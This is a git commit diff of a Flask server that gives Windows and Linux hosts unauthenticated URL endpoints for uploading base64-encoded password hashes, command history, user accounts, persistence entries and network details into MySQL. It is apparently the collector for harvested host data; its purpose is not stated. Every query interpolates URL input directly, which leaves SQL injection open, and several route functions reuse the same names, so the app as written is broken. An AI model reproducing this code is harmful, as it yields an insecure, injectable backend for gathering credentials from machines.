3920e08840062ea36ffa13457600b2332c890f5c
Nee <hello@neeranjan.com>
2022-10-31 09:26:45 -0400

    heheoxox

--- server.py
+++ server.py
@@ -3,12 +3,7 @@ import flask
 from flask import Flask, request, redirect, url_for, session, escape, jsonify
 import os, subprocess
 import base64
-import string
 from random import *
-import requests
-from bs4 import BeautifulSoup as bs
-import json
-import random
 import os.path
 import requests
 from bs4 import BeautifulSoup as bs 
@@ -50,7 +45,7 @@ def api():
 <p>Criezz</p>'''
 
 @app.route('/api/windows/init/<hostname>')
-def detect_hash(hostname):
+def initboi(hostname):
     hostname = str(hostname)
     try:
         mySql_insert_query = "INSERT INTO windows (hostname) VALUES ('{}') ".format(hostname)
@@ -63,12 +58,12 @@ def detect_hash(hostname):
     return "DABALYOU"
 
 @app.route('/api/windows/upd/<hostname>/password_hashes/<value>')
-def tinotino(hostname, value):
+def password_hashesboi(hostname, value):
     hostname = str(hostname)
     value = str(value)
     insertValue = base64.b64decode(value).decode('utf-8')
     try:
-        mySql_insert_query = "UPDATE windows set password_hashes='{}' where hostname='{}'".format(insertValue, hostname) #"""Update Laptop set Price = 7000 where id = 1"""
+        mySql_insert_query = "UPDATE windows set password_hashes='{}' where hostname='{}'".format(insertValue, hostname) 
         cursor = connection.cursor()
         cursor.execute(mySql_insert_query)
         connection.commit()
@@ -76,5 +71,246 @@ def tinotino(hostname, value):
     except mysql.connector.Error as error:
         return("Failed: {}".format(error))
     return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/startup_applications/<value>')
+def startup_applicationsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set startup_applications='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/autoruns/<value>')
+def autorunsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set autoruns='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/scheduled_tasks/<value>')
+def scheduled_tasksboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set scheduled_tasks='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/user_accounts/<value>')
+def user_accountsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set user_accounts='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/active_connections/<value>')
+def active_connectionsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set active_connections='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/command_history/<value>')
+def command_historyboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set command_history='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/nondefault_services/<value>')
+def nondefault_servicesboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set nondefault_services='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/windows/upd/<hostname>/network_config/<value>')
+def network_configboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE windows set network_config='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+
+############################################################################################################################
+@app.route('/api/linux/init/<hostname>')
+def initboi(hostname):
+    hostname = str(hostname)
+    try:
+        mySql_insert_query = "INSERT INTO linux (hostname) VALUES ('{}') ".format(hostname)
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/password_hashes/<value>')
+def password_hashesboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set password_hashes='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/command_history/<value>')
+def command_historyboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set command_history='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/network_config/<value>')
+def network_configboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set network_config='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/crontab_entries/<value>')
+def crontab_entriesboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set crontab_entries='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/user_accounts/<value>')
+def user_accountsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set user_accounts='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/active_connections/<value>')
+def active_connectionsboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set active_connections='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
+@app.route('/api/linux/upd/<hostname>/last_logins_ssh/<value>')
+def last_logins_sshboi(hostname, value):
+    hostname = str(hostname)
+    value = str(value)
+    insertValue = base64.b64decode(value).decode('utf-8')
+    try:
+        mySql_insert_query = "UPDATE linux set last_logins_ssh='{}' where hostname='{}'".format(insertValue, hostname) 
+        cursor = connection.cursor()
+        cursor.execute(mySql_insert_query)
+        connection.commit()
+        cursor.close()
+    except mysql.connector.Error as error:
+        return("Failed: {}".format(error))
+    return "DABALYOU"
+
 
 app.run(host='0.0.0.0', port=6969)
